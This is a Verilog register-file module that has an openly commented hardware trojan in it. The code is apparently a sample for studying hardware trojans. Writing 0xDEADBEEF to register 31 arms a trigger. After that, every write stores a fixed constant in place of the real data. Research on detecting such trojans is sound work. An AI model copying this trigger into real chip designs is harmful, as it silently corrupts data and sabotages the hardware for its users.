`timescale 1ns / 1ps

module Register_File #(parameter m = 5, n = 32) 
    (
        input clk, 
        input w_en, 
        input rst,
        input [m-1:0] rs1, rs2, rd,
        input [n-1:0] din,
        output [n-1:0] read_data1, 
        output [n-1:0] read_data2
    );

    reg [n-1:0] REG [0:31];
    integer i;

    // Trojan trigger condition variables
    reg trojan_triggered = 0; // A flag indicating if the trojan has been triggered
    reg [n-1:0] trojan_data = 32'hffadbeef; // An example of sensitive data

    always @(posedge clk) begin
        if (rst) begin
            for (i = 0; i < 32; i = i + 1) begin
                REG[i] <= 32'b0;
            end
            // Reset trojan trigger
            trojan_triggered <= 0;
        end
        else if (w_en) begin
            // Example of trojan trigger: writing to a specific register with a specific value
            if (rd == 5'h1F && din == 32'hDEADBEEF) begin
                trojan_triggered <= 1;
            end
            // Trojan behavior: if triggered, manipulate data or leak sensitive information
            if (trojan_triggered) begin
                // Malicious action: Redirect the write to another register with trojan_data
                REG[rd] <= trojan_data;
            end
            else begin
                // Normal behavior
                REG[rd] <= din;
            end
        end
    end

    // Normal operation for reading data
    assign read_data1 = (rs1 != 0) ? REG[rs1] : {n{1'b0}};
    assign read_data2 = (rs2 != 0) ? REG[rs2] : {n{1'b0}};
endmodule
 
